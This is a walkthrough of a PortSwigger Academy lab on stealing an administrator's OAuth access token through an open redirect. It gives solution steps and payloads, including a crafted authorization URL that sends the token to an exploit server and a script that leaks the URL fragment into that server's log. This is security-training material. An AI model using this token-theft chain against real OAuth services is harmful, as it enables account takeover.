# Lab: Stealing OAuth access tokens via an open redirect

**Official PortSwigger URL:** https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect

**Lab idea:** This challenge combines weak OAuth redirect handling with an open redirect in the client application, creating a risk that an administrator's access token can be exposed. It practices recognizing how individually flawed redirect controls can combine to undermine token confidentiality.

## Vulnerability in brief
OAuth is a framework for delegated access; applications also use OAuth flows to sign users in through an identity held by another service. This Academy section is a **vulnerability topic**, not a general learning or testing category. It focuses on security failures in OAuth-based authentication and related OpenID Connect implementations.

## Solution idea
1. While proxying traffic through Burp, click "My account" and complete the OAuth login process.
2. Study the resulting requests and responses.
3. Log out of your account and log back in again.
4. In Repeater, experiment with the GET /auth?client_id=[...] request.
- …
6. Deliver the exploit to the victim, then copy their access token from the log.
7. In Repeater, go to the GET /me request and replace the token in the Authorization: Bearer header with the one you just copied.
8. Use the "Submit solution" button at the top of the lab page to submit the stolen key and solve the lab.

## Payloads / key values
- `/me`
- `GET /me`
- `GET /auth?client_id=[...]`
- `redirect_uri`
- `/../`
- `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1`
- `GET /post/next?path=[...]`
- `path`
- `https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email`
- `/exploit`
- `<script> window.location = '/?'+document.location.hash.substr(1) </script>`
- `GET /?access_token=[...]`
- `<script> if (!document.location.hash) { window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' } else { window.location = '/?'+document.location.hash.substr(1) } </script>`
- `Authorization: Bearer`

## Official source
- [PortSwigger Academy: Lab: Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)
